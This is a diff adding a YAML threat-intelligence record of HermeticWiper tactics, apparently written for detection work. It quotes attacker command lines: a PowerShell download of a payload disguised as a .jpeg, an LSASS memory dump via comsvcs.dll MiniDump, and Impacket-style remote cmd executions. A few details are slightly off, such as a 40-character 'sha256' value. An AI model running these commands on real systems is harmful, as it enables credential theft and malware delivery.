@@ -1,0 +1,357 @@
+---
+header:
+  sightingReportId: 7bd10bfd-b577-468a-a873-47982e44d2e5
+  status: wip
+  description: This Threat Sighting documents observed TTPs for HermeticWiper destructive malware. This Threat Sighting is based on public reports. It was discovered being deployed in Ukraine in 2022. After deleting volume shadow copies the malware abuses a legitimate EaseUS driver to destroy data on Windows systems.
+  author: Alejandro Houspanossian (@lekz86)
+  acknowledgement: "@TalosSecurity, Qualys Threat Research, Symantec's @threatintel, @TrellixLabs"
+  tlp: white
+  threatInformation:
+    adversaries:
+    - unknown
+    malware:
+    - HermeticWiper
+    tools:
+    - Impacket
+    - PowerShell
+    - WMI
+    - EaseUS Partition Master drivers
+    lolbas:
+    - SCHTASKS.exe
+    - CMD.exe
+    - CERTUTIL.exe
+    - RunDll32.exe
+    - comsvcs.dll
+threatSightings:
+  - sighting: Execution - Threat Actor used likely _WMI_ and _Impacket_ to execute _CMD_ commands on victim endpoints for Command And Control.
+    id: 1237028a-26fd-46ad-aa5d-90ba6ffdd123
+    behaviors:
+    - behavior: _CMD_ executions with command-line patterns similar to _Impacket_.
+      id: 4560acb3-01ea-42df-9322-85bb515eb456
+      type: Process Created
+      weapon: impacket
+      processes:
+      - cmdLine:
+        - cmd.exe /Q /c powershell -c \"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1')\"> \\\\127.0.0.1\\ADMIN$\__[TIMESTAMP] 2>&1
+        - cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1
+        - cmd.exe /Q /c powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\" 1> \\127.0.0.1\ADMIN$\__1638457529.1247072 2>&1
+        process: C:\\Windows\\system32\\cmd.exe
+      notes:
+      - Patterns in the command-line arguments is consistent with Impackets _wmiexec.py_ script.
+      - _Impacket_ is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols.
+      - _Impacket_ contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.
+      - https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
+      att&ck:
+        defenseEvasion:
+        - "T1047 - Windows Management Instrumentation"
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Execution - Threat Actor used _PowerShell_ to download malware masqueraded as _.jpeg_ file from _internal server_ for Lateral Movement.
+    id: abc7028a-26fd-4abc-aa5d-90ba6ffddabc
+    behaviors:
+    - behavior: _PowerShell_ downloaded file from _internal server_ to _Temp_ folder.
+      id: 12304cb3-07e3-42df-9322-85ff515eb123
+      type: Process Created
+      weapon: powershell
+      processes:
+      - cmdLine:
+        - powershell -c \"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1')\"> \\\\127.0.0.1\\ADMIN$\__[TIMESTAMP] 2>&1
+        process: powershell.exe
+        parentProcess: C:\\Windows\\system32\\wbem\\wmiprvse.exe
+      notes:
+      - '"CSIDL_SYSTEM_DRIVE" is not on the list of recognized environment variables.'
+      - https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables
+      att&ck:
+        lateralMovement:
+        - "T1570 - Lateral Tool Transfer"
+        defenseEvasion:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+  - sighting: Execution - Threat Actor used _SCHTASKS_ to periodically create malicious file at Windows Policy Definition folder for Persistence.
+    id: 3337028a-2333-46ad-aa5d-90ba6ffdd333
+    behaviors:
+    - behavior: Scheduled Task executed.
+      id: 4560acb3-01ea-556f-9322-85bb515eb456
+      type: Process Created
+      weapon: schtasks
+      processes:
+      - process: C:\\Windows\\system32\\schtasks.exe
+        cmdLine:
+        - 'schtasks /run /tn \"\\Microsoft\\Windows\\termsrv\\licensing\\TlsAccess\"'
+        parentProcess: #{binaryName}.exe
+      att&ck:
+        execution:
+        - "T1053.005 - Scheduled Task/Job: Scheduled Task"
+    - behavior: _CMD move_ file from _Temp_ folder to Windows Policy Definition folder.
+      id: 6660acb3-01ea-42df-9322-85bb515e5556
+      type: Process Created
+      weapon: schtasks
+      processes:
+      - cmdLine:
+        - cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1
+        process: C:\\Windows\\system32\\cmd.exe
+        parentProcess: C:\\Windows\\system32\\svchost.exe
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+        defenseEvasion:
+        - "T1053.005 - Scheduled Task/Job: Scheduled Task"
+  - sighting: Execution - Threat Actor used _CERTUTIL_ to check internet connectivity for Discovery.
+    id: 1237028a-2333-46ad-aa5d-90ba612dd333
+    behaviors:
+    - behavior: CERTUTIL performed network connections.
+      type: DNS Queried
+      id: 1239c3a8-b63a-4bba-1223-de87ac4eb812
+      weapon: certutil
+      connections:
+      - dstHost: trustsecpro[.]com
+        protocol: udp
+        direction: outbound
+        process: C:\\Windows\\system32\\certutil.exe
+      - dstHost: whatismyip[.]com
+        protocol: udp
+        direction: outbound
+        process: C:\\Windows\\system32\\certutil.exe
+      att&ck:
+        discovery:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+  - sighting: Execution - Threat Actor used _PowerShell_ to download additional malware masqueraded as _jpeg_ file from external server for Command And Control.
+    id: 4547028a-2331-46ad-aa12-90ba612dd234
+    behaviors:
+    - behavior: _PowerShell_ performed network connections.
+      type: DNS Queried
+      id: 5679c3a8-b63a-4bba-1263-de87ac4eb567
+      weapon: powershell
+      connections:
+      - dstHost: confluence.novus[.]ua
+        protocol: udp
+        direction: outbound
+        process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+      att&ck:
+        discovery:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+  - sighting: Execution - Threat Actor used _COM+ Service DLL_ to dump _LSASS_ process memory via _RunDll32_ and _PowerShell_ for Credential Access.
+    id: bbb7028a-1234-4abc-aa5d-90ba6ffddbbc
+    behaviors:
+    - behavior: _CMD_ executions with _Impacket_ patterns in command-line.
+      id: 1230acb3-01ea-42df-9322-85bb515eb5a5
+      type: Process Created
+      weapon: impacket
+      processes:
+      - process: C:\\Windows\\system32\\cmd.exe
+        cmdLine:
+        - 'cmd.exe /Q /c powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\" 1> \\127.0.0.1\ADMIN$\__1638457529.1247072 2>&1'
+        parentProcess: C:\\Windows\\system32\\wbem\\wmiprvse.exe
+      att&ck:
+        defenseEvasion:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: _PowerShell_ launched _RunDll32_.
+      id: 5550acb3-01ea-42df-9322-85bb515eb5a5
+      type: Process Created
+      weapon: powershell
+      processes:
+      - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+        cmdLine:
+        - 'powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\"'
+        parentProcess: C:\\Windows\\system32\\cmd.exe
+      att&ck:
+        defenseEvasion:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+    - behavior: _RunDll32_ launched _COM+ Services DLL_ (comsvcs.dll) to create a process memory dump.
+      id: 3430acb3-01ea-42df-9322-85bb515eb343
+      type: Process Created
+      weapon: rundll32
+      processes:
+      - process: C:\\Windows\\system32\\rundll32.exe
+        cmdLine:
+        - 'rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full'
+        parentProcess: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+      notes:
+      - _comsvcs.dll_ is the _COM+ Service DLL_ in Windows.
+      - _comsvcs.dll MimiDump_ method is used to create processes memory dumps.
+      - The target process is provided as argument; in this case is pId = 600.
+      - Using _comsvcs.dll MimiDump_ for creating LSASS process memory dumps is a known trick.
+      att&ck:
+        credentialAccess:
+        - "T1003.001 - OS Credential Dumping: LSASS Memory"
+        defenseEvasion:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+  - sighting: Execution - HermeticWiper used _valid digital signatures_ to undermine security controls for Defense Evasion.
+    id: ccb7028a-1234-4abc-aa5d-90ba6ffdd123
+    behaviors:
+    - behavior: Malware was signed with valid Certificate.
+      id: ab804cb3-07453-42df-9322-85ff515eb678
+      type: File Created
+      weapon: malware
+      files:
+      - name: '#{binaryName}.exe'
+        path: '*\\#{binaryName}.exe'
+        sha256: 912342F1C840A42F6B74132F8A7C4FFE7D40FB77
+        issuerName: Hermetica Digital Ltd
+      notes:
+      - Code signing provides a level of authenticity on a binary from the developer.
+      att&ck:
+        defenseEvasion:
+        - "T1553.002 - Subvert Trust Controls: Code Signing"
+  - sighting: Execution - HermeticWiper used _embedded resources_ to stage _EaseUS Partition Master_ drivers for Defense Evasion.
+    id: 5677028a-1234-4abc-cc5d-90ba6ffdd567
+    behaviors:
+    - behavior: Files created at _Windows Driver_ folder with partially randomized file names.
+      type: File Created
+      weapon: malware
+      id: 12967c9d-dab0-4852-90d3-1b22a68ca812
+      files:
+        - name: fndr.sys
+          path: 'C:\\Windows\\System32\\drivers\\fndr.sys'
+          sha256: 8C614CF476F871274AA06153224E8F7354BF5E23E6853358591BF35A381FB75B
+          process: #{binaryName}.exe
+        - name: njdr.sys
+          path: 'C:\\Windows\\System32\\drivers\\njdr.sys'
+          sha256: 96B77284744F8761C4F2558388E0AEE2140618B484FF53FA8B222B340D2A9C84
+          process: #{binaryName}.exe
+      notes:
+      - 4 versions of the drivers are included in the resources.
+      - The drivers are compressed using the _MSLZ_ format.
+      - Only one driver is written to disk with partially randomized file name.
+      - 'File name follows the pattern: "[a-z]{2}dr.sys"'
+      att&ck:
+        defenseEvasion:
+        - "T1140 - Deobfuscate/Decode Files or Information"
+  - sighting: Defense Evasion - HermeticWiper used _Native APIs_ to execute the drivers as a _Windows Service_ for Execution.
+    id: ddd7028a-1234-4abc-cc5d-90ba6ffddcdd
+    behaviors:
+    - behavior:  _Native APIs_ calls (_OpenSCManagerW_, _OpenServiceW_, _CreateServiceW_ and _StartServiceW_) to create a _Windows Service_.
+      type: Api Invoked
+      id: 4565d4a0-4f11-4ebf-afd7-a063969f7456
+      weapon: malware
+      apis:
+      - apiName: OpenSCManagerW
+        process: #{binaryName}.exe
+      - apiName: OpenServiceW
+        process: #{binaryName}.exe
+      - apiName: CreateServiceW
+        process: #{binaryName}.exe
+      - apiName: StartServiceW
+        process: #{binaryName}.exe
+      att&ck:
+        execution:
+        - "T1106 - Native API"
+        - "T1543 - Create or Modify System Process: Windows Service"
+        - "T1569.002 - System Services: Service Execution"
+    - behavior: _Windows Registry_ modification for new service.
+      type: RegValue Created
+      weapon: malware
+      id: 45623cbe-9bec-46a0-8e01-8cf576e07234
+      registries:
+        - keyName: HKLM\\SYSTEM\\CurrentControlSet\\services\\#[a-z]{2}dr
+          keyValueName: ImagePath
+          keyValue: \\??\\C:\\WINDOWS\\system32\\Drivers\\zddr.sys
+          process: #{binaryName}.exe
+      att&ck:
+        execution:
+        - "T1112 - Modify Registry"
+        - "T1543 - Create or Modify System Process: Windows Service"
+  - sighting: Execution - HermeticWiper used _AdjustTokenPrivileges_ Native API to give itself _SeLoadDriverPrivilege_, _SeShutDownPrivilege_ and _SeBackupPrivilege_ privileges for Privilege Escalation.
+    id: abc7028a-1234-4abc-123d-90ba6ffddabc
+    behaviors:
+    - behavior:  _Native APIs_ to increase privilege
+      type: Api Invoked
+      id: 1235d4a0-4f11-4ebf-afd7-a063969f7123
+      weapon: malware
+      apis:
+      - apiName: AdjustTokenPrivileges
+        process: #{binaryName}.exe
+      notes:
+        - An access token is a type of object that describes the security context of a process or thread, and is assigned to all processes created in the system.
+        - '_SeLoadDriverPrivilege_: Allows to Load and unload device drivers. The activation of this policy in the context of non-privileged users implies a significant risk due to the possibility of executing code in kernel space.'
+        - '_SeShutDownPrivilege_: Allows to shutdown local system. Ransomware and wipers might rely on this for larger impact.'
+        - '_SeBackupPrivilege_: Allows to read files even when such right is not specified on the Access Control List. Ransomware and wipers might rely on this for larger impact.'
+        - https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
+        - https://grzegorztworek.medium.com/ive-got-the-power-4f44b1998c88
+      att&ck:
+        execution:
+        - "T1106 - Native API"
+        - "T1134 - Access Token Manipulation"
+  - sighting: Execution - HermeticWiper used _Native APIs_ to stop the Volume Shadow Copy Service for Impact.
+    id: 12347111-8d0f-474c-98fb-5f122fcde456
+    behaviors:
+    - behavior: _Native APIs_ to stop VSS service.
+      type: Api Invoked
+      id: 67896647-103d-4f58-ba0f-d87a703be678
+      weapon: malware
+      apis:
+      - apiName: OpenSCManagerW
+        process: #{binaryName}.exe
+      - apiName: OpenServiceW
+        process: #{binaryName}.exe
+      - apiName: ChangeServiceConfigW
+        process: #{binaryName}.exe
+      - apiName: ControlService
+        process: #{binaryName}.exe
+      notes:
+      - The VSS service creates incremental back-ups over time. It's is often disabled by ransomware and wipers.
+      - An alternative method is to use _SC.EXE_ to disable VSS service.
+      att&ck:
+        execution:
+        - "T1106 - Native API"
+        impact:
+        - "T1490 - Inhibit System Recovery"
+  - sighting: Defense Evasion - HermeticWiper used _EaseUS Partition Master_ drivers for direct access to storage devices to overwrite files for Impact.
+    id: 7d2181b1-b807-4033-8b66-c2f06702a0de
+    behaviors:
+    - behavior: Malware iterates from _PhysicalDrive0_ to _PhysicalDrive100_ to overwrite _MBR_.
+      id: d66669c0-b976-440b-ae81-de53cd3dfefc
+      type: Api Invoked
+      weapon: malware
+      apis:
+      - apiName: SetFilePointerEx
+        process: #{binaryName}.exe
+      - apiName: WriteFile
+        process: #{binaryName}.exe
+      notes:
+      - MBR (Master Boot Record) is located on first 512 bytes each drive.
+      att&ck:
+        impact:
+        - "T1561.002 - Disk Structure Wipe"
+    - behavior: Malware overwrites files under specific folders with random data.
+      id: 123669c0-b976-440b-ae81-de53cd3df123
+      type: Api Invoked
+      weapon: malware
+      apis:
+      - apiName: SetFilePointerEx
+        process: #{binaryName}.exe
+      - apiName: WriteFile
+        process: #{binaryName}.exe
+      notes:
+      - "Target folders: C:\\Documents and Settings\\, C:\\System Volume Information\\, C:\\Windows\\SYSVOL\\, C:\\Windows\\System32\\winevt\\Logs, C:\\Windows\\System32\\winevt\\Logs"
+      att&ck:
+        impact:
+        - "T1561.001 - Disk Content Wipe"
+  - sighting: Execution - HermeticWiper used _InitiateSystemShutdownEx_ Native API to shutdown the system for Impact.
+    id: 9dc27111-8d0f-474c-98fb-5f122fcde013
+    behaviors:
+    - behavior: _Native APIs_ to increase privilege
+      id: cbb96647-103d-4f58-ba0f-d87a703be13b
+      type: Api Invoked
+      weapon: malware
+      apis:
+      - apiName: InitiateSystemShutdownEx
+        process: #{binaryName}.exe
+      notes:
+      - 'This API requires _SeShutDownPrivilege_ privilege.'
+      att&ck:
+        execution:
+        - "T1106 - Native API"
+        - "T1529 - System Shutdown/Reboot"
+footer:
+  changeTracking:
+    created: 2022-03-02
+    lastModified: 2022-03-18
+    sightingVersion: 1.1
+    schemaVersion: 1.7
+  references:
+    - https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/
+    - https://blog.talosintelligence.com/2022/02/threat-advisory-hermeticwiper.html
+    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia
+    - https://blog.qualys.com/vulnerabilities-threat-research/2022/03/01/ukrainian-targets-hit-by-hermeticwiper-new-datawiper-malware
+    - https://www.trellix.com/en-au/about/newsroom/stories/threat-labs/digging-into-hermeticwiper.html
